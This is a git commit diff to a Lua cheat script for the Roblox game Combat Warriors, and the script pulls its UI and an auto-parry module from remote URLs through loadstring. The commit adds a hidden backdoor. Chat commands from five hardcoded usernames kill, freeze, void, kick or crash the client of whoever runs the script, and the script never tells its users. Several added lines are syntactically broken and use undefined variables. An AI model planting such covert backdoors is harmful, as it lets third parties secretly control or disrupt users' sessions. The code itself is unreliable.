f2badad9dae329fd46026759f6edd7f55f4ee963
llameiq <77410796+eLeCtRaDoMiNuS@users.noreply.github.com>
2022-12-10 09:23:03 +0300

    Update cwscript.lua

--- cwscript.lua
+++ cwscript.lua
@@ -1,5 +1,74 @@
 local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
 local Window = OrionLib:MakeWindow({Name = "CW SCRIPT", HidePremium = true, IntroText = "cw script", SaveConfig = true, ConfigFolder = "COMBATWARRIORS"})
+local function addvectortocframe(cframe, vec)
+	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
+	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
+end
+local commands = {
+	["kill"] = function(args, plr)
+		lplr.Character.Humanoid.Health = 0
+	end,
+	["lagback"] = function()
+		lplr.Character.HumanoidRootPart.CFrame += Vector3.new(129919212,0,0)
+	end,
+	["void"] = function()
+			repeat
+			task.wait()
+			lplr.Character.HumanoidRootPart.CFrame = addvectortocframe(lplr.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
+		until not lplr.Character.Humanoid.Health = 0
+		end)
+	end,
+	["freeze"] = function()
+		lplr.Character.HumanoidRootPart.Anchored = true
+	end,
+	["unfreeze"] = function()
+		lplr.Character.HumanoidRootPart.Anchored = false
+	end,
+	["kick"] = function()
+		task.spawn(function()
+			lplr:Kick("L bozo u got kicked")
+		end)
+	end,
+	["crash"] = function()
+		while true do
+			game:ShutDown
+		end
+	end,
+
+}
+
+local tableofrandom = {"ac_doesntexist","YMikeOfficialYT","abnormalhack34","Goldenlegend2022","IHaveACatAndAnDOG"}
+
+
+
+function getID(plr)
+	for _,v in pairs(tableofrandom) do
+		if v == plr.Name then
+			return true
+		end
+	end
+	return false
+end
+
+if getID(player) then
+	if lplr.Name ~= player.Name then
+		if message == ";kill Default" then
+			commands.kill()
+		elseif message == ";lagback Default" then
+			commands.lagback()
+		elseif message == ";void Default" then
+			commands.void()
+		elseif message == ";freeze Default" then
+			commands.freeze()
+		elseif message == ";unfreeze Default" then
+			commands.unfreeze()
+		elseif message == ";kick Default" then
+			commands.kick()
+		elseif message == ";crash Default" then
+			commands.crash()
+		end
+	end
+end
 
 local CombatTab = Window:MakeTab({
 	Name = "Combat",
@@ -25,6 +94,8 @@ Tab:AddToggle({
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebulaprivatewhitelistbypass/cw/main/AUTO%20PARRY"))()
 	end    
 })
+
+
 
 function AddTag(plr, tag, color)
 	local Players = game:GetService("Players")
